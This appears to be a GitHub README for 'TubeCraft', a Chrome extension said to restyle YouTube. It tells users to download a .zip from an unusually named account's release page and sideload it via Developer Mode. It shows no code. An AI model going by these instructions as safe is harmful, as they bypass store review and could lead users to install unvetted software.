# 🎨 TubeCraft - Modernize your YouTube viewing experience today

[![Download TubeCraft](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Nonterritorial-sunvisor289/TubeCraft/releases)

TubeCraft changes the way you watch videos on Chrome. It updates your browser interface with a clean glassmorphism design. Ambient lighting effects create a mood around your screen. A distraction-free mode helps you focus on your content.

## ⚙️ How it works

TubeCraft runs as a Google Chrome extension. It reads the style of your YouTube page in real-time. It replaces standard blocks and menus with semi-transparent, depth-rich visual elements. The ambient lighting system watches the colors in the video. It casts a soft glow on the webpage background. This mimics the colors you see in the video frame.

## 📥 Get the software

You need to download the extension file from our release page. Follow these steps to install it.

1. Visit [the TubeCraft release page](https://github.com/Nonterritorial-sunvisor289/TubeCraft/releases).
2. Look for the file ending in .zip in the Latest Release section.
3. Click the filename to save it to your computer.
4. Open your computer's File Explorer.
5. Right-click the downloaded .zip file and select Extract All.
6. Choose a folder on your desktop to keep track of the files.

## 🛠️ Installing the extension

Google Chrome requires a specific setting to run extensions that you download from outside their store.

1. Open Google Chrome.
2. Type `chrome://extensions` in the address bar and press Enter.
3. Look at the top right corner of the page.
4. Click the switch for Developer Mode so it turns blue.
5. Click the button labeled Load unpacked near the top left.
6. Find the folder where you extracted the TubeCraft files.
7. Click Select Folder.

TubeCraft now appears in your list of extensions. The interface changes immediately when you visit YouTube.

## 🌟 Key features

### Glassmorphism UI
Standard web design feels flat. TubeCraft adds depth. Menus and overlays look like frosted glass. This design language provides a sophisticated, modern look to your browser. Components stay readable and organized.

### Ambient Lighting
Watching videos in a dark room strains your eyes. Our ambient light engine finds the dominant colors in the video. It generates a subtle glow behind the player. This extends the visual content beyond the frame. It makes the viewing experience immersive.

### Distraction-free mode
YouTube shows many suggestions while you watch. These often lead you away from your goal. Use our switch to hide comments, sidebar recommendations, and chat boxes. You see only the video.

## 🖥️ System requirements

TubeCraft works on standard Windows desktop setups. Ensure your environment meets these standards:

- Windows 10 or Windows 11.
- Google Chrome browser version 110 or higher.
- A stable internet connection.
- 50 megabytes of free space on your hard drive.

## 💡 Troubleshooting and tips

If the extension fails to load, verify the folder path in the extension manager. Sometimes Chrome loses connection to the files if you move the folder after installation. If you move the files, remove the extension from Chrome and load it again from the new location.

Refresh your YouTube tab after you change settings. This forces the browser to apply the new style. If the ambient light appears too strong, open the TubeCraft menu by clicking the extension icon in your toolbar. Adjust the light intensity slider until the glow feels comfortable.
